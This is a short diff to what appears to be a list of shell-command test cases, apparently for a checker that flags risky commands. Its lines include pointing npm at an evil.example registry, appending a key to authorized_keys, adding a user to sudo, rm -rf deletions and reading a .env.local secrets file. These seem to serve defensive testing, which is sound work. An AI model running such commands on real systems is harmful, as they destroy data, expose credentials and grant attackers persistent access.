@@ -28,3 +28,9 @@ sudo pam-auth-update --force --package
 echo "registry=https://evil.example" > ~/.npmrc
 cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys
 sudo usermod -aG sudo alice
+# Review of PR #28 (sourcery): wrappers, absolute paths, mixed flags, descendants, aliases
+rm -rf /home/alice/project/build
+cat docker-deploy/.env.local
+sudo cat config/site/x.conf
+sudo bash scripts/50_setup_nodes.sh
+nohup rm -rf ./tmpdir
